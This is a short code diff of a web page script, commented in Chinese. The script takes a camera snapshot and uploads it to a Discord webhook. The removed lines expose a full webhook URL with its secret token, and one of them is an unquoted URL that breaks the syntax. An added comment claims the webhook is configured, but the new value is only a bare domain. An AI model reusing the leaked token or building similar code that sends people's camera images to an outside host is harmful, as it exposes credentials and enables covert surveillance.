@@ -25,7 +25,8 @@
 
   <script>
     let currentStream = null;
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG"; // 請替換成你的 Discord Webhook
+    // 這裡已經設定好你的 Discord Webhook 網址
+    const DISCORD_WEBHOOK = "https://discord.com"; 
 
     async function startCamera(facingMode) {
       const videoElement = document.getElementById("video");
@@ -90,7 +91,8 @@
       formData.append("file", blob, "camera_capture.jpg");
 
       try {
-        const response = await fetch(https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG, {
+        // 修正處：直接帶入上面定義好的 Webhook 變數，避免語法崩潰
+        const response = await fetch(DISCORD_WEBHOOK, {
           method: "POST",
           body: formData
         });
